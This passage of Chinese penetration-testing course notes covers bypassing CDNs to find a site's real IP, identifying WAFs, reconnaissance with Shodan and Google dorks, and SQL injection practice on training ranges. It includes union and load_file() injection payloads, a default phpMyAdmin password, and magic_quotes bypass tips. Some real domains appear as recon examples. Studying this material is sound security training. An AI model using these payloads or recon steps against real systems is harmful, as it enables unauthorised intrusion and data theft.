class="variable">$md_data</span> = <span class="keyword">array</span>();                 <span class="comment">//获取加密字符中的ASCII数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$md_len</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$tmp</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$md_data_source</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$data1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$data2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$md_data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;<span class="comment">//最终还原</span></span><br><span class="line">        <span class="variable">$i</span> = <span class="variable">$key</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span> &gt;= <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>))&#123;</span><br><span class="line">            <span class="variable">$i</span> = <span class="variable">$i</span> - <span class="title function_ invoke__">strlen</span>(<span class="variable">$mkey</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$dd</span> = <span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$od</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$mkey</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$md_data_source</span>,<span class="variable">$dd</span>);</span><br><span class="line">        <span class="variable">$data1</span> .=<span class="title function_ invoke__">chr</span>((<span class="variable">$dd</span>+<span class="number">128</span>)-<span class="variable">$od</span>);        <span class="comment">//原数据加key的Ascii大于128</span></span><br><span class="line">        <span class="variable">$data2</span> .=<span class="title function_ invoke__">chr</span>(<span class="variable">$dd</span>-<span class="variable">$od</span>);              <span class="comment">//原数据加key的Ascii小于128</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data1 =&gt;&quot;</span>.<span class="variable">$data1</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;data2 =&gt;&quot;</span>.<span class="variable">$data2</span>.<span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;HxclIiEqIiUY&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">decrypt</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="带盐加密"><a href="#带盐加密" class="headerlink" title="带盐加密"></a>带盐加密</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(md5($pass).$salt)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">google</span><br><span class="line">	inurl:id=MQ==</span><br><span class="line">		MQ==解密是1</span><br></pre></td></tr></table></figure>

<h3 id="day07-CDN相关技术"><a href="#day07-CDN相关技术" class="headerlink" title="day07-CDN相关技术"></a>day07-CDN相关技术</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">	CDN的全称是Content Delivery Network,即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后</span><br><span class="line">	超级ping(ping.chinaz.com)	ping ip或域名，看是否会出现变化无</span><br><span class="line">	nslookup 域名，看是否会有很多节点</span><br><span class="line">7.2 CDN对测试有何影响&amp;如何绕过</span><br><span class="line">    子域名查询：有的网站主域名会做CDN，但是子域名可能不会做，可以通过子域名推算主域名ip</span><br><span class="line">    	子域名和主站的关系	同ip 同网段 或不在一个网段</span><br><span class="line">    邮件服务查询：我们访问别人，可能通过CND，但别人访问我们通常不会走CDN</span><br><span class="line">    国外地址请求：国外访问国内网站，大概率没有cdn节点的话，可能直接走原ip</span><br><span class="line">    遗留文件，扫描全网</span><br><span class="line">    	谷歌inurl:phpinfo.php</span><br><span class="line">    		这个文件可能会保存真实ip</span><br><span class="line">    黑暗引擎搜索特定文件</span><br><span class="line">    	shodan</span><br><span class="line">    	zoomeye</span><br><span class="line">    	钟馗之眼</span><br><span class="line">    	fofa</span><br><span class="line">    dns历史记录，以量打量：CDN节点是有流量上限的，用光之后就会直通原机，这也是一种流量攻击</span><br><span class="line">7.3 测试</span><br><span class="line">    子域名上面的小技巧</span><br><span class="line">        二级域名和三级域名查到的结果可能不一样</span><br><span class="line">        主域名和子域名查询到的可能不一样</span><br><span class="line">        	sp910.com,(xueersi.com改了)</span><br><span class="line">        	sp910.com和m.sp910.com（mobile）内容一样，子域名可能没做cdn</span><br><span class="line">        DNS历史记录=第三方接口(接口查询)		#微步社区</span><br><span class="line">        	sp910</span><br><span class="line">        采集/国外请求(同类型访问)</span><br><span class="line">        邮件源码测试对比第三方查询(地区分析)</span><br><span class="line">        	用foxmail查看mozhe登录验证的邮件，邮件邮件源代码</span><br><span class="line">        get-site-ip.com</span><br><span class="line">        黑暗引擎(shodan搜指定hash文件)</span><br><span class="line">		扫全网 fuckcdn，w8fuckcdn，zmap等</span><br><span class="line">		工具扫描</span><br><span class="line">		认为判定，根据网站的域名备案推测</span><br><span class="line">        本地清下dns，然后hosts里写上得到的ip和域名，如果是cdn可能会出现刷新异常，如果打开很快大概率是原机</span><br><span class="line">资料</span><br><span class="line">	https://www.shodan.io</span><br><span class="line">	https://x.threatbook.cn					#微步社区</span><br><span class="line">	http://ping.chinaz.com</span><br><span class="line">	https://www.get-site-ip.com/			#国外查询网站</span><br><span class="line">	https://asm.ca.com/en/ping.php			#好像免费</span><br><span class="line">	</span><br><span class="line">	#fuckcdn w8fuckcdn zmap</span><br><span class="line">	https://github.com/boy-hack/w8fuckcdn	#w8Fuckcdn通过扫描全网绕过CDN获取网站IP地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如下图找出网站的ico然后运行计算hash值然后使用shodan搜索得出ip</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\小迪2020.assets\1665891407844.png" alt="1665891407844"></p>
<h3 id="day08-信息收集-架构-搭建-WAF"><a href="#day08-信息收集-架构-搭建-WAF" class="headerlink" title="day08-信息收集-架构 搭建 WAF"></a>day08-信息收集-架构 搭建 WAF</h3><p><img src="C:\Users\hyy\Desktop\小迪2020.assets\640-1688030934153.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">CMS识别技术</span><br><span class="line">	帮助识别平台</span><br><span class="line">	开源工具</span><br><span class="line">源码获取技术</span><br><span class="line">	前面	淘宝什么的</span><br><span class="line">架构信息获取</span><br><span class="line">    前面 	操作系统信息之类</span><br><span class="line"></span><br><span class="line">8.1 站点搭建分析</span><br><span class="line">    搭建习惯-目录型站点，两个目录不同的程序</span><br><span class="line">    	sti.blcu.edu.cn		sti.blcu.edu.cn/bbs/(打不开了)</span><br><span class="line">    搭建习惯-端口类站点</span><br><span class="line">    	web.0516jz.com	80 8080端口</span><br><span class="line">    搭建习惯-子域名站点</span><br><span class="line">    	goodlift---www.bbs	子域名2套系统</span><br><span class="line">    搭建习惯-类似域名站点</span><br><span class="line">    	jmlsd---cn.com.net等各种域名后缀</span><br><span class="line">    搭建习惯-旁注, c段站点</span><br><span class="line">    	旁注：同一服务器不同站点		百度搜索旁注查询	</span><br><span class="line">    		192.168.1.100</span><br><span class="line">    			www.a.com</span><br><span class="line">    			www.b.com</span><br><span class="line">    			...</span><br><span class="line">    	C段：同网段不同服务器不同站点</span><br><span class="line">    		192.168.1.100</span><br><span class="line">    			www.a.com</span><br><span class="line">    			www.b.com</span><br><span class="line">    			...</span><br><span class="line">            192.168.1.101</span><br><span class="line">    			www.c.com</span><br><span class="line">    			www.d.com</span><br><span class="line">    			...</span><br><span class="line">    搭建习惯-搭建软件特征站点		shadan搜索useragent</span><br><span class="line">    	useragent很全的一般是搭建软件，比如宝塔 phpstudy</span><br><span class="line">    		宝塔面板8888端口，用http访问不用https</span><br><span class="line">    		phpMyAdmin弱口令密码root root</span><br><span class="line">    		ip/phpmyadmin这个是window的不区分大小写phpMyAdmin</span><br><span class="line">8.2 WAF防护分析</span><br><span class="line">	什么是WAF应用? --  Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称：WAF）。</span><br><span class="line">		安全狗、宝塔、云盾、安骑士</span><br><span class="line">	一般公司的都是带硬件的，自己玩的一般是软件</span><br><span class="line">    如何快速识别WAF?</span><br><span class="line">    	wafwoof</span><br><span class="line">    		https://github.com/EnableSecurity/wafw00f</span><br><span class="line">    识别WAF对于安全测试的意义?</span><br><span class="line">	资源</span><br><span class="line">        https://www.shodan.io/</span><br><span class="line">        https://www.webscan.cc/ </span><br><span class="line">        https://github.com/EnableSecurity/wafw00f</span><br></pre></td></tr></table></figure>

<h3 id="day09-信息收集-APP及其他资产"><a href="#day09-信息收集-APP及其他资产" class="headerlink" title="day09-信息收集 APP及其他资产"></a>day09-信息收集 APP及其他资产</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">APP及其他资产</span><br><span class="line">在安全测试中，若WEB无法取得进展或无WEB的情况下，我们需要借助APP或其他资产在进行信息收集,从而开展后续渗透</span><br><span class="line">9.1 APE提取一键反编译提取</span><br><span class="line">使用反编译工具，尝试获取包了里的源码</span><br><span class="line">9.2 APP抓数据包进行工具配合</span><br><span class="line">使用burp suite设置代理，或者wireshark抓数据包，进行分析</span><br><span class="line">9.3 各种第三方应用相关探针技术</span><br><span class="line">https://www.shodan.io/</span><br><span class="line">https://fofa.so/</span><br><span class="line">9.4 各种服务接口信息相关探针技术</span><br><span class="line">记录</span><br><span class="line">使用burp代理模拟器时，提示证书错误，后将burp生成的证书导入后正常，导入时需要将.cer改成.der。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">黑暗引擎的端口扫描会有遗漏自己用zenmap扫</span><br><span class="line">备案查询</span><br></pre></td></tr></table></figure>

<h3 id="day10-信息收集-资产监控拓展"><a href="#day10-信息收集-资产监控拓展" class="headerlink" title="day10-信息收集 资产监控拓展"></a>day10-信息收集 资产监控拓展</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Github监控 -- 便于收集整理最新exp或poc -- 便于发现相关测试目标的资产</span><br><span class="line">	python写脚本去监测</span><br><span class="line">各种子域名查询 DNS,备案,证书 全球节点请求cdn</span><br><span class="line">-- 枚举爆破或解析子域名对应 -- 便于发现管理员相关的注册信息</span><br><span class="line">黑暗引擎相关搜索 -- fofa，shodan, zoomeye 微信公众号接口获取dgh</span><br></pre></td></tr></table></figure>

<p> <img src="C:\Users\hyy\Desktop\小迪2020.assets\640-1688030862796.png" alt="图片"> </p>
<h4 id="github监控代码"><a href="#github监控代码" class="headerlink" title="github监控代码"></a>github监控代码</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">代码参考https://blog.csdn.net/weixin_45889197/ /details/119299883</span><br><span class="line">几处修改</span><br><span class="line">	requests而不是request</span><br><span class="line">	排版，参考博客基础上读代码修改空格和回车</span><br><span class="line">	server酱的调用方法参看它的api说明修改https://sct.ftqq.com/sendkey</span><br><span class="line">代码解析</span><br><span class="line">	很普通的爬虫</span><br><span class="line">	api.github.com/....这个页面的json格式化有待学习</span><br><span class="line">资源</span><br><span class="line">    https://crt.sh 							#查证书</span><br><span class="line">    https://dnsdb.io						#</span><br><span class="line">    https://sct.ftqq.com/login</span><br><span class="line">    https://tools.ipip.net/cdn.php			#免费 别的国家ping cdn</span><br><span class="line">    https://github.com/bit4woo/teemo		#信息搜集软件</span><br><span class="line">    https://securitytrails.com/domain/www.baidu.com/history/a	#查cdn</span><br><span class="line">0    https://www.opengps.cn/Data/IP/ipplus.aspx		#ip定位</span><br></pre></td></tr></table></figure>

<h3 id="day11-WEB漏洞-必懂知识点"><a href="#day11-WEB漏洞-必懂知识点" class="headerlink" title="day11-WEB漏洞 必懂知识点"></a>day11-WEB漏洞 必懂知识点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">资料</span><br><span class="line">	https://github.com/zhuifengshaonianhanlu/pikachu------靶场</span><br></pre></td></tr></table></figure>

<h3 id="day12-WEB漏洞-SQL简要"><a href="#day12-WEB漏洞-SQL简要" class="headerlink" title="day12-WEB漏洞 SQL简要"></a>day12-WEB漏洞 SQL简要</h3><p> <img src="C:\Users\hyy\Desktop\小迪2020.assets\640-1688030896540.png" alt="图片"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqllab首次安装需要导入下security数据库，百度一下</span><br><span class="line">注入时需要信息收集 见下面</span><br><span class="line">mysql5.0之后才有information_schema</span><br><span class="line">D:\phpStudy\MySQL\bin&gt;mysql.exe -u root -p		也可以从win的phpstudy那个小软件进去</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\phpStudy\WWW\sql_lab\sqli-labs-master\sql-connections\sql-connect.php包含的db-creds.inc决定了用户权限，root为最高权限可以操作其他库，其他用户在本数据库user表去找或者创建</span><br><span class="line"></span><br><span class="line">信息收集</span><br><span class="line">    判断数据个数order by x 根据正确域错误的格式来判断个数，然后select 1,2,3,...</span><br><span class="line">    查询数据库 version()</span><br><span class="line">    数据库名字 database()</span><br><span class="line">    数据库用户 user() 使用数据库的用户</span><br><span class="line">    操作系统 @@version_compile_os</span><br></pre></td></tr></table></figure>

<h3 id="day13-WEB-MYSQL注入"><a href="#day13-WEB-MYSQL注入" class="headerlink" title="day13-WEB MYSQL注入"></a>day13-WEB MYSQL注入</h3><p><img src="C:\Users\hyy\Desktop\小迪2020.assets\640-1688030915633.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">sql-lab举例，/Less-2/index.php查看源文件 权限文件可知</span><br><span class="line">	/Less-2/index.php中包含/sql-connections/sql-connect</span><br><span class="line">	/sql-connections/sql-connect又包含/sql-connection/db-creds.inc</span><br><span class="line">	该文件设置了权限，默认root，说明从网页Less-2访问操作数据库使用的是root权限</span><br><span class="line">文件读写操作</span><br><span class="line">    load_file():读取函数 里面使用&#x27;/&#x27; 防止转译</span><br><span class="line">    	union select 1,2,load_file(&#x27;路径&#x27;)</span><br><span class="line">    	常见的load_file()读取的敏感信息</span><br><span class="line">    		https://blog.csdn.net/weixin_30292843/article/details/99381669</span><br><span class="line">    into outfile或into dumpfile:导出函数</span><br><span class="line">获取路径的常见方法</span><br><span class="line">    报错显示</span><br><span class="line">    	intext:warning inurl:php</span><br><span class="line">    遗留文件</span><br><span class="line">    	inurl:phpinfo.php</span><br><span class="line">    		script_filename结合搜索栏路径确定网站路径</span><br><span class="line">    漏洞报错</span><br><span class="line">    	通过搜到的漏洞</span><br><span class="line">    平台配置文件</span><br><span class="line">    	apache的D:\phpStudy\Apache\conf\vhosts.conf</span><br><span class="line">    爆破</span><br><span class="line">    </span><br><span class="line">magic_quotes_gpc在php.ini中可以找到注意向上向下查询</span><br><span class="line">    对应php中的addslashes()函数</span><br><span class="line">    当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线</span><br><span class="line">    	路径用hex编码可以绕过，不用单引号</span><br><span class="line">sqlmap字典在\data\txt目录下</span><br></pre></td></tr></table></figure>

<h3 id="day14-SQL注入-提交注入"><a href="#day14-SQL注入-提交注入" class="headerlink" title="day14-SQL注入 提交注入"></a>day14-SQL注入 提交注入</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#简要明确参数类型</span><br><span class="line">	数字，字符，搜索，JSON等</span><br><span class="line">    数字可以直接加在sql中</span><br><span class="line">    字符就要通过单双引号接入sql语句中</span><br><span class="line"></span><br><span class="line">#简要明确请求方法</span><br><span class="line">	GET, POST, COOKIE, REQUEST, HTTP头等</span><br><span class="line">	$c = $_COOKIE[&#x27;x&#x27;]	传键值对x</span><br><span class="line">	$s = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]	这个变量可以获取操作系统的信息</span><br><span class="line">		搜索$_SERVER查看具体</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其中SQI语句干扰符号:  &#x27;, &quot;, %, ), &#125; 等，具体需看写法</span><br><span class="line">&#x27;&quot;]&#125;)可以作为默认测试写法</span><br><span class="line"></span><br><span class="line">curl -X POST https://api.zoomeye.org/user/login -d</span><br><span class="line">&#123;</span><br><span class="line"> &quot;username&quot;: &quot;foo@bar.com&quot;,</span><br><span class="line"> &quot;password&quot;: &quot;foobar&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- sql-lab</span></span><br><span class="line"><span class="comment">-- Less-5</span></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"><span class="comment">-- Less-6</span></span><br><span class="line">$id <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;		<span class="comment">-- 相当于多了双引号 .是字符连接符</span></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"><span class="comment">-- Less-11	post</span></span><br><span class="line"><span class="comment">-- Less-20 	cookie	post和cookie两个sql语句</span></span><br><span class="line"><span class="comment">-- Less-18  $_SERVER[&#x27;HTTP_USER_AGENT&#x27;]	insert注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--json 注入</span></span><br><span class="line">json<span class="operator">=</span>&#123;&quot;username&quot;:&quot;Dumb&quot; <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span>#&#125;</span><br></pre></td></tr></table></figure>



<h3 id="day15-SQL注入之Oracle、MongoDB等注入"><a href="#day15-SQL注入之Oracle、MongoDB等注入" class="headerlink" title="day15-SQL注入之Oracle、MongoDB等注入"></a>day15-SQL注入之Oracle、MongoDB等注入</h3><p> <img src="C:\Users\hyy\Desktop\小迪2020.assets\640-1688030938593.png" alt="图片"> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">简要学习各种数据库的注入特点</span><br><span class="line">    Access(asp), mysql, mssql(sql server), mongoDB, postgresql, sqlite,oracle, sybase等</span><br><span class="line">    Access数据库放在网站下</span><br><span class="line">	access只有一个数据库，会保存在网站源码下面，没有文件写入等操作,没有information_schema</span><br><span class="line">		墨者靶场Access,用字典去猜,如果猜不到怎么办?</span><br><span class="line">			union select 1,username,passwd,4 from admin</span><br><span class="line">		墨者靶场sql server postgresql oracle mongDB</span><br><span class="line">			</span><br><span class="line">		</span><br><span class="line">数据库架构组成，数据库高权限操作</span><br><span class="line"></span><br><span class="line">连接数据库的文件决定了谁连接数据库，享有怎样的权限，没有information_schema</span><br><span class="line"></span><br><span class="line">简要学习各种注入工具的使用指南</span><br><span class="line">熟悉工具的支持库，注入模式，优缺点等</span><br><span class="line">Sqlmap, NoSQLAttack, Pangolin等</span><br><span class="line"></span><br><span class="line">涉及资源</span><br><span class="line">    https://www.cnblogs.com/xishaonian/p/6173644.html </span><br><span class="line">    https://www.cnblogs.com/bmjoker/p/9326258.html </span><br><span class="line">    https://github.com/youngyangyang04/NoSQL Attack  linux环境下支持</span><br><span class="line">    MongoDB的工具，P14 https://github.com/sqlmapproject/sqlmap </span><br><span class="line">    https://blog.csdn.net/qq_39936434/category_9103379.html </span><br><span class="line">    https://blog.csdn.net/hack8/article/details/6427911</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果数据库类型判断错误，注入一定会失败</span><br><span class="line">关于注入工具可以抓包来看如何进行注入来学习</span><br><span class="line">mssq l注入参考</span><br><span class="line">https://blog.csdn.net/hhhshd/article/details/121356157</span><br><span class="line">postgresql注入参考</span><br><span class="line">https://www.cnblogs.com/yilishazi/p/14710349.html</span><br><span class="line">sqlmap全参数详解</span><br><span class="line">https://blog.csdn.net/Breeze_CAT/article/details/80628392</span><br><span class="line"></span><br><span class="line">sqlmap不支持mongodb，资料有支持的工具</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json注入 如果需要闭合，闭合的是sql语句的单引号或双引号，判断value值是数字还是字符</span><br></pre></td></tr></table></figure>

<h3 id="day16-SQL注入之查询方式及报错盲注"><a href="#day16-SQL注入之查询方式及报错盲注" class="headerlink" title="day16-SQL注入之查询方式及报错盲注"></a>day16-SQL注入之查询方式及报错盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- select查询数据 在网站应用中进行数据显示查询操作</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line"><span class="comment">-- insert插入数据 在网站应用中进行用户注册添加等操作</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> news (id, url, text) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;$t&#x27;</span>)</span><br><span class="line"><span class="comment">-- delete删除数据 后台管理里面删除文章删除用户等操作</span></span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id </span><br><span class="line"><span class="comment">-- update更新数据 会员或后台中心数据同步或缓存等操作</span></span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> pwd<span class="operator">=</span><span class="string">&#x27;$p&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span> <span class="keyword">and</span> username<span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"><span class="comment">-- order by排序数据 一般结合表名或列名进行数据排序操作</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $id</span><br><span class="line"><span class="keyword">select</span> id, name, price <span class="keyword">from</span> news <span class="keyword">order</span> <span class="keyword">by</span> $<span class="keyword">order</span></span><br><span class="line">重点理解:</span><br><span class="line">我们可以通过以上查询方式与网站应用的关系，注入点产生地方或应用猜测到对方的<span class="keyword">SQL</span>查询方式</span><br><span class="line"> </span><br><span class="line">pikachu漏洞练习平台</span><br><span class="line">	<span class="operator">/</span>pikachu<span class="operator">/</span>vul<span class="operator">/</span>sqli<span class="operator">/</span>sql_str.php				字符注入</span><br><span class="line">	<span class="operator">/</span>pikachu<span 